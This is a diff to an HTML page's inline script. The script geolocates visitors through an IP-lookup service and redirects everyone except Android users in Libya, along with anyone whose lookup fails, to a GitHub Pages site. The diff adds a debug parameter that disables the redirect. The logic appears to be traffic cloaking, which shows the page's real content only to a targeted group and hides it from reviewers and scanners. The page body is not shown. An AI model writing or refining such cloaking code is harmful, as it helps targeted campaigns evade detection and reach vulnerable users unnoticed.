@@ -4,7 +4,18 @@
 
 <script>
 (async function () {
+  const params = new URLSearchParams(window.location.search);
+  const debug = params.get("debug") === "1";
+
+  const goGithub = () =>
+    window.location.replace("https://superwork61-creator.github.io/balenformen/");
+
   try {
+    if (debug) {
+      console.log("DEBUG MODE: redirect disabled");
+      return;
+    }
+
     const res = await fetch("https://ipapi.co/json/");
     const data = await res.json();
 
@@ -12,13 +23,14 @@
     const isAndroid = /Android/i.test(navigator.userAgent);
 
     if (!(isLibya && isAndroid)) {
-      window.location.replace("https://superwork61-creator.github.io/balenformen/");
+      goGithub();
     }
   } catch (e) {
-    window.location.replace("https://superwork61-creator.github.io/balenformen/");
+    if (!debug) goGithub();
   }
 })();
 </script>
+
 
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -1032,3 +1044,4 @@
 </body>
 
 </html>
+
